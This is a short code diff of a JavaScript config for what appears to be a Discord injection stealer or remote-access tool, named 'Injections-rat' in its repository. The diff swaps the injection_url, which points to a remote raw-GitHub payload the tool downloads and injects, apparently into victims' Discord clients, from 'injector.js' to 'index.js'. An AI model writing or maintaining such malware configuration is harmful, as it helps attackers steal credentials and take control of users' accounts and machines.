@@ -14,7 +14,7 @@ const config = {
   embed_name: 'Injection', 
   embed_icon: 'https://cdn.discordapp.com/attachments/1068916221354983427/1074265014560620554/e6fd316fb3544f2811361a392ad73e65.jpg?size=4096'.replace(/ /g, '%20'), 
   embed_color: 2895667, 
-  injection_url: 'https://raw.githubusercontent.com/Athology0000/Injections-rat/main/injector.js', 
+  injection_url: 'https://raw.githubusercontent.com/Athology0000/Injections-rat/main/index.js', 
   /**
    
    **/
